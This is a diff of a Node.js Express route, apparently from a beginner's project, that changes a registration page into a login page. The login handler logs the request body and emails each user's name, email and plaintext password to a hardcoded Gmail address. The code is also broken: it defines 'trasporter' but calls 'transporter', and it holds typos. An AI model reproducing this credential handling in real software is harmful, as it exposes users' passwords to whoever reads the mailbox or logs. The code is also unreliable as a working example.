@@ -5,7 +5,7 @@ var nodemailer = require('nodemailer')
 
 /* GET home page. */
 router.get('/', function(req, res, next) {
-  res.render('registro');
+  res.render('iniciosesion');
 });
 
 router.post('/', async (req, res, next) => {
@@ -13,15 +13,13 @@ router.post('/', async (req, res, next) => {
   var apellido = req.body.apellido;
   var email = req.body.email;
   var contraseña = req.body.contraseña;
-  var telefono = req.body.telefono;
-  var socio = req.body.socio;
 
   console.log(req.body)
 
   var obj = {
     to: 'borrothiago@gmail.com',
-    subject: 'Registro',
-    html: nombre + " " + apellido + " se registro correctamente en tu sitio web, con los siguiente datos: " + email + ", contraseña: " + contraseña + ", " + telefono + ", N° de socio " + socio + "."
+    subject: 'Inicio de Sesión',
+    html: nombre + " " + apellido + " inicio sesión conrrectamente, con los siguiente datos: " + email + ", contraseña: " + contraseña + "."
   }
 
   var trasporter = nodemailer.createTransport({
@@ -35,8 +33,8 @@ router.post('/', async (req, res, next) => {
 
   var info = await transporter.sendMail(obj);
 
-  res.render("/registro", {
-    message: "Registro completado correctamente",
+  res.render("/iniciosesion", {
+    message: "Sesión Iniciada Correctamente",
   });
 
 });
